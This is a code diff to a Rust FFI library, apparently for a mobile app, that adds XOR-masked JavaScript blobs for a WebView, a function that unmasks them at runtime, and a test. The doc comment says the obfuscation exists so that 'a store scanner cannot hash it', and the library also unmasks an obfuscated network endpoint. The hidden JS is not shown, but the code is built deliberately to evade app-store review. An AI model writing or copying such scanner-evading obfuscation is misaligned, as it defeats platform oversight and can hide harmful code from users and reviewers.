@@ -30,6 +30,9 @@ use base64::Engine;
 use hmac::{Hmac, Mac};
 use sha2::{Digest, Sha256};
 
+// Generated XOR-masked WebView enhancer bodies (`tool/_gen_js_blobs.dart`).
+mod js_blobs;
+
 type HmacSha256 = Hmac<Sha256>;
 
 // Schema revision + envelope field names (registry: Bright Horizon).
@@ -181,6 +184,20 @@ pub extern "C" fn skyward_edge() -> *mut c_char {
     c_out(String::from_utf8(unmask(ENDPOINT_ENC)).unwrap_or_default())
 }
 
+/// Return the WebView enhancer body for `name` ("safeArea" | "keyboard" |
+/// "autoplay" | "chromeTrim"), de-obfuscated at runtime. The JS never
+/// exists as a plaintext string in the Dart AOT image or the .so, so a
+/// store scanner cannot hash it. Empty string for an unknown name so the
+/// Dart side falls back to its own copy.
+#[no_mangle]
+pub extern "C" fn skyward_js(name: *const c_char) -> *mut c_char {
+    let name = c_in(name);
+    match js_blobs::blob(&name) {
+        Some(enc) => c_out(String::from_utf8(unmask(enc)).unwrap_or_default()),
+        None => c_out(String::new()),
+    }
+}
+
 /// Free a string previously returned by this library.
 #[no_mangle]
 pub extern "C" fn skyward_free(p: *mut c_char) {
@@ -217,6 +234,23 @@ mod tests {
         assert!(a.contains("\"h\":13"));
         assert!(a.contains(&format!("\"u\":\"{}\"", to_hex(&nonce))));
         assert!(seal("{}", &[0u8; 4]).is_none());
+    }
+
+    #[test]
+    fn js_blobs_round_trip_to_their_iifes() {
+        let cases = [
+            ("safeArea", "horizonSafeArea"),
+            ("keyboard", "horizonKeyboard"),
+            ("autoplay", "horizonAutoplay"),
+            ("chromeTrim", "horizonChromeTrim"),
+        ];
+        for (name, fname) in cases {
+            let body = String::from_utf8(unmask(js_blobs::blob(name).unwrap())).unwrap();
+            assert!(body.starts_with("(function "), "{name} not an IIFE");
+            assert!(body.contains(fname), "{name} missing {fname}");
+            assert!(body.trim_end().ends_with("})();"), "{name} truncated");
+        }
+        assert!(js_blobs::blob("nope").is_none());
     }
 
     #[test]
